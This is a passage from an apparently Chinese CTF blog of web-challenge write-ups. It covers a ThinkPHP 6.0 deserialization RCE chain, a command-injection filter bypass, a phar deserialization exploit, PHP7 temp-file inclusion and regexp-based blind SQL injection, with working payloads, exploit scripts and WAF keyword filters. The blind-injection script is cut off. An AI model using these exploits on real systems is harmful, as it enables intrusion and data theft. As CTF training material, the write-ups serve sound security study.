item.description:
 &lt;h2 id=&#34;安洵杯-2019iamthinking&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#安洵杯-2019iamthinking&#34;&gt;#&lt;/a&gt; [安洵杯 2019] iamthinking&lt;/h2&gt;
&lt;h2 id=&#34;1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF2019%5Diamthinking/1.png&#34; alt=&#34;1&#34;&gt;&lt;/h2&gt;
&lt;p&gt;dirsearch 搜集到 www.zip 文件：&lt;/p&gt;
&lt;p&gt;发现是 thinkphp6.0 版本：&lt;/p&gt;
&lt;p&gt;thinkphp6.0 有两个计较明显的漏洞：&lt;br&gt;
一个文件上传：要开启 session（本题没开）&lt;/p&gt;
&lt;p&gt;一个就是反序列化：本体有个 unserilize 函数&lt;/p&gt;
&lt;p&gt;那就是反序列化了&lt;/p&gt;
&lt;p&gt;php 脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

namespace think\model\concern;

trait Attribute
&amp;#123;
    private $data = [&amp;quot;key&amp;quot; =&amp;gt; [&amp;quot;key1&amp;quot; =&amp;gt; &amp;quot;cat /flag&amp;quot;]];
    private $withAttr = [&amp;quot;key&amp;quot;=&amp;gt;[&amp;quot;key1&amp;quot;=&amp;gt;&amp;quot;system&amp;quot;]];
    protected $json = [&amp;quot;key&amp;quot;];
&amp;#125;
namespace think;

abstract class Model
&amp;#123;
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = &#39;&#39;)
    &amp;#123;
        $this-&amp;gt;lazySave = true;
        $this-&amp;gt;withEvent = false;
        $this-&amp;gt;exists = true;
        $this-&amp;gt;force = true;
        $this-&amp;gt;table = $obj;
        $this-&amp;gt;jsonAssoc = true;
    &amp;#125;
&amp;#125;

namespace think\model;

use think\Model;

class Pivot extends Model
&amp;#123;
&amp;#125;
$a = new Pivot();
$b = new Pivot($a);
$c = array($b);
echo urlencode(serialize($c));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;phpgcc 好像搞不了（首字母不能是 O，在&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./phpggc -u ThinkPHP/RCE2 &#39;system(&amp;quot;cat /flag&amp;quot;);&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出来的时候是 O 开头）&lt;/p&gt;
&lt;p&gt;仔细的反序列化过程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjQ3OT91X2F0b2tlbj1lMTk4M2NjYTcxMTViYjczZGM4MjYxMzk1ZjM4ZTQyOCZhbXA7dV9hc2lnPTFhMGMzOTlhMTcyNzA3ODI1MzU5OTM0NzdlMDAzNQ==&#34;&gt;https://xz.aliyun.com/t/6479?u_atoken=e1983cca7115bb73dc8261395f38e428&amp;amp;u_asig=1a0c399a17270782535993477e0035&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;easybypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#easybypass&#34;&gt;#&lt;/a&gt; easybypass&lt;/h2&gt;
&lt;p&gt;源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; &amp;lt;?php

highlight_file(__FILE__);

$comm1 = $_GET[&#39;comm1&#39;];
$comm2 = $_GET[&#39;comm2&#39;];


if(preg_match(&amp;quot;/\&#39;|\`|\\|\*|\n|\t|\xA0|\r|\&amp;#123;|\&amp;#125;|\(|\)|&amp;lt;|\&amp;amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&amp;quot;, $comm1))
    $comm1 = &amp;quot;&amp;quot;;
if(preg_match(&amp;quot;/\&#39;|\&amp;quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&amp;#123;|\&amp;#125;|\(|\)|&amp;lt;|\&amp;amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&amp;quot;, $comm2))
    $comm2 = &amp;quot;&amp;quot;;

$flag = &amp;quot;#flag in /flag&amp;quot;;

$comm1 = &#39;&amp;quot;&#39; . $comm1 . &#39;&amp;quot;&#39;;
$comm2 = &#39;&amp;quot;&#39; . $comm2 . &#39;&amp;quot;&#39;;

$cmd = &amp;quot;file $comm1 $comm2&amp;quot;;
system($cmd);
?&amp;gt;
cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file or directory) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到这里很清楚了，也就是在我们传的参数两边套上了双引号然后，拼接到 cmd 的后面这时考虑到引号闭合就好了直接上 payload&lt;/p&gt;
&lt;figure class=&#34;highlight ruby&#34;&gt;&lt;figcaption data-lang=&#34;ruby&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;dir /;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;?&lt;/span&gt;comm1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;php&lt;span class=&#34;token string-literal&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#34;;tac /f*;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;comm2&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;直接出 flag&lt;/p&gt;

 &lt;h2 id=&#34;swpuctf-2018simplephp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpuctf-2018simplephp&#34;&gt;#&lt;/a&gt; [SWPUCTF 2018]SimplePHP&lt;/h2&gt;
&lt;p&gt;有读取文件，能读到如下文件：&lt;/p&gt;
&lt;p&gt;file.php?file=index.php/base.php/upload_file.php/function.php/file.php/class.php&lt;/p&gt;
&lt;p&gt;file.php 文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
header(&amp;quot;content-type:text/html;charset=utf-8&amp;quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
$file = $_GET[&amp;quot;file&amp;quot;] ? $_GET[&#39;file&#39;] : &amp;quot;&amp;quot;; 
if(empty($file)) &amp;#123; 
    echo &amp;quot;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&amp;quot;; 
&amp;#125; 
$show = new Show(); 
if(file_exists($file)) &amp;#123; 
    $show-&amp;gt;source = $file; 
    $show-&amp;gt;_show(); 
&amp;#125; else if (!empty($file))&amp;#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&amp;#125; 
?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意使用的是 file_exists () 函数。&lt;/p&gt;
&lt;p&gt;class.php 文件内容如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
    public function __construct($name)
    &amp;#123;
        $this-&amp;gt;str = $name;
    &amp;#125;
    public function __destruct()
    &amp;#123;
        $this-&amp;gt;test = $this-&amp;gt;str;
        echo $this-&amp;gt;test;
    &amp;#125;
&amp;#125;

class Show
&amp;#123;
    public $source;
    public $str;
    public function __construct($file)
    &amp;#123;
        $this-&amp;gt;source = $file;   //$this-&amp;gt;source = phar://phar.jpg
        echo $this-&amp;gt;source;
    &amp;#125;
    public function __toString()
    &amp;#123;
        $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
        return $content;
    &amp;#125;
    public function __set($key,$value)
    &amp;#123;
        $this-&amp;gt;$key = $value;
    &amp;#125;
    public function _show()
    &amp;#123;
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
            die(&#39;hacker!&#39;);
        &amp;#125; else &amp;#123;
            highlight_file($this-&amp;gt;source);
        &amp;#125;

    &amp;#125;
    public function __wakeup()
    &amp;#123;
        if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
            echo &amp;quot;hacker~&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到 Class 想到反序列化，但是没看到啥 unserialize () 函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function _show()
&amp;#123;
    if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
        die(&#39;hacker!&#39;);
    &amp;#125; else &amp;#123;
        highlight_file($this-&amp;gt;source);
    &amp;#125;

&amp;#125;
public function __wakeup()
&amp;#123;
    if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
        echo &amp;quot;hacker~&amp;quot;;
        $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有个 WAF，不能直接查看 f1ag.php，所以需要用其他方法读取。很容易想到利用 file_get_contents 或 highlight_file 函数读取文件内容。&lt;/p&gt;
&lt;p&gt;涉及知识点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;除了 unserialize () 来利用反序列化漏洞之外，还可以利用 phar 文件以序列化的形式存储用户自定义的 meta-data 这一特性，扩大 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;受影响的函数如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这道题满足这几个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存在受影响的函数 file_get_contents、file_exists。&lt;/li&gt;
&lt;li&gt;phar 文件能够上传到服务器端。&lt;/li&gt;
&lt;li&gt;没有过滤【:】、【/】、【pchar】等关键词。&lt;/li&gt;
&lt;li&gt;有可用的魔术方法作为 “跳板”。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file_get_contents () 函数是 file_get 方法中的，file_get 方法在 get 方法中被调用，get 方法在__get 魔术方法中被触发：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__get：当希望访问某个对象的未定义的或者不可访问的属性不报错，我们可以在类里定义__get 方法，这样系统在此刻会自动调用该方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此要考虑触发__get 魔术方法，访问一个 Test 类中不存在的属性。&lt;/p&gt;
&lt;p&gt;Show 类有这么一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public $source;
public function __toString()
&amp;#123;
    $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
    return $content;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;__toString：用于一个类被当成字符串时应怎样回应。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里的 source 属性是在 Show 类里的，Test 类里并不存在，因此 str [‘str’] = new Test () 可以触发__get 魔术方法。&lt;/p&gt;
&lt;p&gt;接下来考虑触发__toString () 类，找到能输出东西的地方，在 C1e4r 类里有如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __destruct()
&amp;#123;
    $this-&amp;gt;test = $this-&amp;gt;str;
    echo $this-&amp;gt;test;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;它会在某个对象的所有引用都被删除或者当对象被显式销毁时执行。&lt;/p&gt;
&lt;p&gt;最后总结思路如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 C1e4r 类，将 str 赋值为 show 类。（$this-&amp;gt;test = $this-&amp;gt;Show）&lt;/li&gt;
&lt;li&gt;C1e4r 类最后会 echo $this-&amp;gt;test; 触发 Show 类的__toString () 魔术方法&lt;/li&gt;
&lt;li&gt;__toString () 魔术方法执行 $content = this-&gt;str[‘str’]-&gt;source;将str[‘str’]赋值为Test类，Test类中不存在source属性，触发Test类的__get(key) 魔术方法。&lt;/li&gt;
&lt;li&gt;因为 $value = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;params[&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;key]; 所以 params=array (‘source’=&amp;gt;’/var/www/html/fl1g.php’);&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;exp 如下：&lt;/p&gt;
&lt;p&gt;需要将 php.ini 中的 phar.readonly 选项设置为 Off，PHPstudy 版本切换 5.5.38。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
class Show
&amp;#123;
    public $source;
    public $str;
&amp;#125;
$phar = new Phar(&amp;quot;1.phar&amp;quot;); //后缀名必须为phar
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); 
// 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?，前面内容不限，但必须以__HALT_COMPILER();?来结尾，否则phar扩展将无法识别这个文件为phar文件
$t = new Test();
$t-&amp;gt;params = array(&amp;quot;source&amp;quot;=&amp;gt;&amp;quot;/var/www/html/f1ag.php&amp;quot;);
$s = new Show();
$s-&amp;gt;str = array(&amp;quot;str&amp;quot;=&amp;gt;$t);
$c = new C1e4r();
$c-&amp;gt;str = $s;
$phar-&amp;gt;setMetadata($c); //将自定义的meta-data存入manifest
$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
//签名自动计算
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;抓包上传改后缀：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/wIq9Vx.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到文件路径，通过查看 function.php 可得知文件存在 upload 文件夹内，恰好这个文件夹可以访问 qwq。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/woSN5R.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;base64 解码得到 flag&lt;/p&gt;
&lt;p&gt;出自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s&#34;&gt;https://www.shawroot.cc/1141.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;npuctf2020ezinclude&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#npuctf2020ezinclude&#34;&gt;#&lt;/a&gt; [NPUCTF2020]ezinclude&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进去发现是用户名与密码错误&lt;/p&gt;
&lt;p&gt;F12 发现提示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;要 md5name 后的字符串等于 pass，不知道 pass，可以 bp 发现传送回来的东西有 hash 这个东西&lt;/p&gt;
&lt;p&gt;直接加入 pass 等于这个 hash 值得到：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flflflflag.php 这个文件。&lt;/p&gt;
&lt;p&gt;但是他会直接进到 404.html 文件&lt;/p&gt;
&lt;p&gt;然后就不会了；接着就是大佬的操作了：&lt;/p&gt;
&lt;p&gt;大佬看到了 php 的版本 7.0.33，直接就是：&lt;/p&gt;
&lt;h4 id=&#34;php7-segment-fault特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7-segment-fault特性&#34;&gt;#&lt;/a&gt; php7 segment fault 特性&lt;/h4&gt;
&lt;p&gt;扫目录可得 dir.php&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;…… 扫不出来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;向 PHP 发送含有文件区块的数据包时，让 PHP 异常崩溃退出，POST 的临时文件就会被保留&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;php &amp;lt; 7.2&lt;br&gt;
php://filter/string.strip_tags/resource=/etc/passwd&lt;/li&gt;
&lt;li&gt;php7 老版本通杀&lt;br&gt;
 php://filter/convert.quoted-printable-encode/resource=data://,% bfAAAAAAAAAAAAAAAAAAAAAAA% ff% ff% ff% ff% ff% ff% ff% ffAAAAAAAAAAAAAAAAAAAAAAAA&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;嫖个脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
from io import BytesIO

mode1 = &amp;quot;php://filter/string.strip_tags/resource=/etc/passwd&amp;quot;
mode2 = &amp;quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;
url = &amp;quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&amp;quot;

url = url + mode1
payload = &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;

files = &amp;#123;
    &amp;quot;file&amp;quot;: BytesIO(payload.encode())
&amp;#125;

res = requests.post(url=url, files=files, allow_redirects=False)

print(res.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问 dir.php：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;有个文件名，访问本地 file=/tmp/phpBWqZND&lt;/p&gt;
&lt;p&gt;该脚本写了一个 php 探针：直接 bp 访问该文件&lt;/p&gt;
&lt;p&gt;因为直接访问好像不能打开，会直接跳转到 404.html 文件里面，无法访问 php 探针。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取 flag，完成撒花～～～～～～～～&lt;/p&gt;

 &lt;h2 id=&#34;nctf2019sqli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019sqli&#34;&gt;#&lt;/a&gt; [NCTF2019]SQLi&lt;/h2&gt;
&lt;p&gt;源码泄露：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到 hint.php&lt;/p&gt;
&lt;p&gt;目的明确：&lt;/p&gt;
&lt;p&gt;只要密码是 admin 的密码就可以获得 flag&lt;/p&gt;
&lt;p&gt;得到提示，这题过滤了好多关键字，只要 password 的密码等于 admin 的密码就能拿到 flag 了，但是怎么拿呢？看了 dalao 的 wp 才发现有 regexp 注入&lt;/p&gt;
&lt;h3 id=&#34;regexp注入正则注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#regexp注入正则注入&#34;&gt;#&lt;/a&gt; regexp 注入（正则注入）&lt;/h3&gt;
&lt;p&gt;这个注入方式呢相当于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlQjglODMlRTUlQjAlOTQlRTclOUIlQjIlRTYlQjMlQTgmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;布尔盲注&lt;/span&gt;吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后 ^ 匹配 e 开头的 password&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;再找个 a 开头的：没有&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析&lt;br&gt;
回到题目里，提示给了串 SQL 语句&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;&#39; and passwd=&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;想要猜解 admin 的密码需要用到 admin，可是题目过滤掉了 admin，但是我们能用其他方法绕过，让 username=\，将语句后面的单引号给转义掉，我们可以构造这样的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||sql;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为题目过滤掉了空格，空格能用内联注释符 /**/ 代替&lt;/p&gt;
&lt;p&gt;注释符 #和 --  被过滤掉了，这里用；%00 截断注释后面的内容&lt;/p&gt;
&lt;p&gt;放入原查询语句相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;\&#39; and passwd=&#39;||sql;%00&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where sql;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这时候就能利用正则进行注入了构建 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||/**/passwd/**/regexp/**/&amp;quot;^x&amp;quot;;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;passwd&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;regexp&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;^x&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先用 burpsuite 跑一下（注意该一下爆破频率，不然 429），看看正确与错误的情况，好写脚本跑&lt;br&gt;
&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;跑完后发现错误的话会有个 js 的弹窗出来，跑对了就没有 ，这里可以看到密码第一位是 y（或 Y，不区分大小写），以此写个 python 脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#buuctf web [NCTF2019]SQLi
import requests
import string


url = &amp;quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&amp;quot;
pw_fuzz = string.ascii_lowercase + string.digits + &amp;quot;_&amp;quot;      #密码字典：小写字母和数字还有下划线
pw = &amp;quot;&amp;quot;     #admin的密码


while True:
    for i in pw_fuzz:
        data=&amp;#123;
            &#39;username&#39;:&#39;\\&#39;,
